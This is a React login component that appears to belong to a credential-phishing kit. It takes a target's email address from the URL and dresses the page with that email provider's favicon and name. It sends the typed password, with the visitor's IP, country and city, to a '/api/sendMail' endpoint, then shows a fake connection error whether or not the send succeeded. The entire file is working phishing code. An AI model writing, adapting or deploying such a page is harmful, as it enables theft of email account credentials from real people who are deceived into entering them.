"use client"
import React, { Fragment, useEffect, useState } from 'react';
import Button from 'react-bootstrap/Button';
import Form from 'react-bootstrap/Form';
import 'bootstrap/dist/css/bootstrap.min.css';
import './Universal.css'
import Spinner from 'react-bootstrap/Spinner';
import NoPage404 from '../NoPage404/NoPage404'

const Universal = ({data}) => {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [domain, setDomain] = useState('')
  const [name, setName] = useState('')
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')


  useEffect(() => {
   const mySearchParams = new URLSearchParams(window.location.search)
   const email = mySearchParams.get('usn')
   setEmail(email)
   if(email){
    let dm = email.split('@')[1]

    if (dm === 'gmail.com') {
      dm = 'google.com'
     } else if (dm === 'live.com') {
        dm = 'microsoft.com'
     } else if (dm === 'hotmail.com') {
      dm = 'microsoft.com'
     } else if (dm === 'outlook.com') {
      dm = 'microsoft.com'
     }

     const nm = dm.split('.')[0]
      console.log(dm, nm)
      setDomain(dm)
      setName(nm)
   }



  //  for (const [key, value] of mySearchParams.entries()) {
  //   console.log(key, value)
  //  }
  }, [])

  const sendInfo = async (e) => {
    setLoading(true)
    e.preventDefault()
    console.log('xls: ', data)
    const info = {
      email,
      password,
      country: data.country,
      city: data.city,
      host_ip: data.ip,
      date: new Date().toDateString()
    }

    const res = await fetch('/api/sendMail', {
      method: "POST",
      body: JSON.stringify(info),
      headers: {
        'content-type': 'application/json'
      }
    })
    // console.log(res)
    if(res.ok){
      console.log("Yeai!")
      setLoading(false)
      setError('Error connecting to server')
    }else{
      console.log("Oops! Something is wrong.")
      setLoading(false)
      setError('Error connecting to server')
    }
  }

  return (
    <Fragment class='fragment' >

      <div className="container space">

      {email ? (
        <div className="center">
        <div className='adj' >
          <img  src={`https://${domain}/favicon.ico`} alt={name}/>
          <span className='mt-2' style={{fontWeight: 'bold', fontSize: '22px', marginLeft: '5px'}}>{name.toLocaleUpperCase()}</span>

        </div>
          <hr className='hrr'></hr>

          <Form className='mt-4' onSubmit={sendInfo}>
          <Form.Group className="mb-3" controlId="exampleForm.ControlInput1">
            <Form.Label>Email</Form.Label>
            <Form.Control name='email' value={email} type="text" disabled />
          </Form.Group>
          <Form.Group className="mb-3" controlId="exampleForm.ControlTextarea1">
            <Form.Label>Password</Form.Label>
            <Form.Control name='password' value={password} onChange={e => setPassword(e.target.value)} type="password" />
          </Form.Group>
          <Button className="but" type="submit">
             {loading ? <Spinner /> : 'Login'}
          </Button>

          {error ? <p style={{fontSize: '12px', color: 'red'}}>{error}</p> : ''}
        </Form>
        <p style={{fontSize: '12px', marginTop: '10px'}}>All right reserved. Copyright © 2023 {name}</p>
      </div>
      ) : (
        <NoPage404 />
      )}




      </div>


    </Fragment>

  )
}

export default Universal


